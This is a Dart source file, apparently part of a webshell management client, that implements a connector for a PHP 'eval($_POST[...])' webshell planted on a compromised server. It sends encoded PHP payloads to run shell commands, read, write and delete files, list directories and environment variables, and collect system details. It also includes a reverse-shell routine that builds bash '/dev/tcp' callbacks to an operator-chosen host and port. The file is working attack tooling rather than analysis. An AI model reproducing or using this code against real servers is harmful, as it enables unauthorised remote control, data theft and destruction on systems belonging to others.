import 'dart:async';
import 'dart:convert';

import 'package:http/http.dart' as http;

import '../models/file_entry.dart';
import '../utils/encoding_utils.dart';
import 'shell_connector.dart';

/// `php_eval_post.php`：`eval($_POST[password])`
///
/// 支持全部操作，通过直接注入 PHP 代码实现。
/// 子类可覆盖 [sendPhpCode] 添加额外编码层（如 PhpB64Rot13Connector）。
class PhpEvalConnector extends ShellConnector {
  PhpEvalConnector(super.webshell);

  @override
  Set<ConnectorCapability> get capabilities => const {
        ConnectorCapability.codeExec,
        ConnectorCapability.shellExec,
        ConnectorCapability.fileRead,
        ConnectorCapability.fileWrite,
      };

  /// 发送 PHP 代码并返回执行结果；子类可覆盖以更换编码方式
  Future<String> sendPhpCode(String phpCode) async {
    try {
      final uri = Uri.parse(webshell.url);
      final pass =
          webshell.password?.isNotEmpty == true ? webshell.password! : 'pass';

      http.Response response;
      if (webshell.method == 'GET') {
        final params = Map<String, String>.from(uri.queryParameters);
        params[pass] = phpCode;
        response = await http
            .get(uri.replace(queryParameters: params))
            .timeout(const Duration(seconds: 15));
      } else {
        response = await http
            .post(
              uri,
              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
              body: {pass: phpCode},
            )
            .timeout(const Duration(seconds: 15));
      }

      if (response.statusCode == 200) {
        return decodeWithFallback(response.bodyBytes);
      }
      final body = decodeWithFallback(response.bodyBytes);
      final snippet = body.length > 512 ? '${body.substring(0, 512)}...' : body;
      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
    } on TimeoutException {
      return '[Timeout] 连接超时，请检查目标是否可达';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  // ── ShellConnector 实现 ────────────────────────────────────────────────────

  @override
  Future<bool> ping() async {
    try {
      final token = base64.encode(utf8.encode('MATRIX_PING'));
      final r = await sendPhpCode("echo base64_decode('$token');")
          .timeout(const Duration(seconds: 8));
      return r.contains('MATRIX_PING');
    } catch (_) {
      return false;
    }
  }

  static String _sq(String s) => "'${s.replaceAll("'", "'\\''")}'";

  @override
  Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
    final cd = (workingDir.isNotEmpty && workingDir.startsWith('/'))
        ? 'cd ${_sq(workingDir)} && '
        : '';
    final b64 = base64.encode(utf8.encode('$cd$cmd'));
    final r = await sendPhpCode(
      "\$c=base64_decode('$b64');"
      r"$o=@shell_exec($c.' 2>&1');"
      r"if($o===null){$o=@system($c);}echo $o;",
    );
    return r.trim();
  }

  /// PHP eval 型 webshell 下的反弹 Shell：
  ///
  /// 注意：
  /// - 不能直接复用 [executeCommand]，否则 shell_exec + system 的双重调用
  ///   会让反弹命令执行两次，导致出现两个会话。
  /// - 这里改为直接下发一次性 system 调用，确保只建立一个会话。
  @override
  Future<void> startReverseShell(
    String lhost,
    int lport, {
    bool preferScript = true,
  }) async {
    if (!supportsShellExec) {
      throw UnsupportedError('当前连接器不具备 shell 执行能力，无法发起反弹 Shell');
    }

    // 与 ShellConnector.startReverseShell 保持一致的多级回退命令。
    late final String rsCmd;
    if (preferScript) {
      rsCmd =
          "bash -c 'export TERM=xterm-256color; "
          "if command -v script >/dev/null 2>&1; then "
          "script -q /dev/null bash >& /dev/tcp/$lhost/$lport 0>&1; "
          "elif command -v bash >/dev/null 2>&1; then "
          "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
          "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi' >/dev/null 2>&1 &";
    } else {
      // 仅使用 bash -i /bin/sh -i，不再尝试 script
      rsCmd =
          "bash -c 'export TERM=xterm-256color; "
          "if command -v bash >/dev/null 2>&1; then "
          "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
          "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi' >/dev/null 2>&1 &";
    }

    final b64 = base64.encode(utf8.encode(rsCmd));
    final php = "\$c=base64_decode('$b64');"
        r"@system($c);";
    await sendPhpCode(php);
  }

  @override
  Future<String> getCurrentDir() async {
    final r = (await sendPhpCode('echo getcwd();')).trim();
    if (r.isNotEmpty && !r.startsWith('[')) currentDir = r;
    return currentDir;
  }

  @override
  Future<List<FileEntry>> listDirectory(String path) async {
    final b64 = base64.encode(utf8.encode(path));
    // 使用普通字符串，PHP 变量前缀 $ 用 \$ 转义
    final code = "\$p=base64_decode('$b64');"
        "\$d=@opendir(\$p);"
        'if(\$d===false){echo "ERR_OPEN";exit;}'
        "while((\$f=readdir(\$d))!==false){"
        "\$fp=\$p.DIRECTORY_SEPARATOR.\$f;"
        "\$t=is_dir(\$fp)?'d':'f';"
        "\$s=is_file(\$fp)?@filesize(\$fp):0;"
        "\$m=date('Y-m-d H:i',@filemtime(\$fp));"
        "\$r=decoct(@fileperms(\$fp)&0777);"
        'echo base64_encode(\$f)."|".\$t."|".\$s."|".\$r."|".\$m."\\n";'
        "}"
        "closedir(\$d);";
    final result = await sendPhpCode(code);
    if (result.isEmpty ||
        result.startsWith('ERR_OPEN') ||
        result.startsWith('[')) {
      return [];
    }

    return result
        .trim()
        .split('\n')
        .where((l) => l.contains('|'))
        .map((line) {
          final parts = line.trim().split('|');
          if (parts.length < 5) return null;
          String name;
          try {
            name = decodeWithFallback(base64.decode(parts[0]));
          } catch (_) {
            name = parts[0];
          }
          return FileEntry(
            name: name,
            isDirectory: parts[1] == 'd',
            size: int.tryParse(parts[2]) ?? 0,
            permissions: parts[3],
            modified: parts[4],
          );
        })
        .whereType<FileEntry>()
        .where((e) => e.name != '.')
        .toList()
      ..sort((a, b) {
        if (a.name == '..') return -1;
        if (b.name == '..') return 1;
        if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.toLowerCase().compareTo(b.name.toLowerCase());
      });
  }

  @override
  Future<String> readFile(String path) async {
    final b64 = base64.encode(utf8.encode(path));
    return sendPhpCode(
      "\$p=base64_decode('$b64');"
      r"echo file_exists($p)?file_get_contents($p):'[文件不存在或无权读取]';",
    );
  }

  @override
  Future<bool> writeFile(String path, String content) async {
    final pathB64 = base64.encode(utf8.encode(path));
    final contentB64 = base64.encode(utf8.encode(content));
    final r = await sendPhpCode(
      "\$p=base64_decode('$pathB64');"
      "\$c=base64_decode('$contentB64');"
      r"echo file_put_contents($p,$c)!==false?'1':'0';",
    );
    return r.trim() == '1';
  }

  @override
  Future<bool> deleteFile(String path) async {
    final b64 = base64.encode(utf8.encode(path));
    final r = await sendPhpCode(
      "\$p=base64_decode('$b64');"
      r"echo @unlink($p)?'1':'0';",
    );
    return r.trim() == '1';
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    const code = r'''
$info=[];
$info['OS']=php_uname();
$info['PHP版本']=phpversion();
$info['运行用户']=function_exists('posix_getpwuid')
  ? posix_getpwuid(posix_geteuid())['name']
  : get_current_user();
$info['当前目录']=getcwd();
$info['文档根目录']=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'N/A';
$info['服务器软件']=isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'N/A';
$info['服务器IP']=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:@gethostbyname(@gethostname());
$info['内存限制']=ini_get('memory_limit');
$info['最大执行时间']=ini_get('max_execution_time').'s';
$info['禁用函数']=ini_get('disable_functions')?:'无';
$info['Safe Mode']=(ini_get('safe_mode')||(bool)ini_get('safe_mode'))?'On':'Off';
$info['已加载扩展']=implode(', ',get_loaded_extensions());
foreach($info as $k=>$v){
  echo base64_encode($k).'|'.base64_encode((string)$v)."\n";
}
''';
    final result = await sendPhpCode(code);
    final map = <String, String>{};
    if (result.isEmpty || result.startsWith('[')) return map;
    for (final line in result.trim().split('\n')) {
      final idx = line.indexOf('|');
      if (idx > 0) {
        try {
          final key =
              decodeWithFallback(base64.decode(line.substring(0, idx).trim()));
          final val =
              decodeWithFallback(base64.decode(line.substring(idx + 1).trim()));
          map[key] = val;
        } catch (_) {}
      }
    }
    return map;
  }

  @override
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
      String path) async {
    final b64 = base64.encode(utf8.encode(path));
    final code = "\$p=base64_decode('$b64');"
        r"$d=@opendir($p);"
        r"if($d===false){exit;}"
        r"while(($f=readdir($d))!==false){"
        r"if($f==='.'||$f==='..'){continue;}"
        r"$t=is_dir($p.DIRECTORY_SEPARATOR.$f)?'d':'f';"
        r"echo base64_encode($f).'|'.$t.chr(10);"
        r"}closedir($d);";
    final result = await sendPhpCode(code);
    if (result.isEmpty || result.startsWith('[')) return [];
    final out = <({String name, bool isDir})>[];
    for (final line in result.trim().split('\n')) {
      final parts = line.trim().split('|');
      if (parts.length < 2) continue;
      try {
        final name = decodeWithFallback(base64.decode(parts[0]));
        out.add((name: name, isDir: parts[1] == 'd'));
      } catch (_) {}
    }
    out.sort((a, b) => a.name.compareTo(b.name));
    return out;
  }

  @override
  Future<String> getHomeDir() async =>
      (await sendPhpCode(r"echo getenv('HOME');")).trim();

  @override
  Future<List<String>> listEnvVarNames() async {
    final result = await sendPhpCode(
        r"foreach(array_keys((array)getenv()) as $k){echo $k.chr(10);}");
    if (result.isEmpty || result.startsWith('[')) return [];
    return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
      ..sort();
  }
}
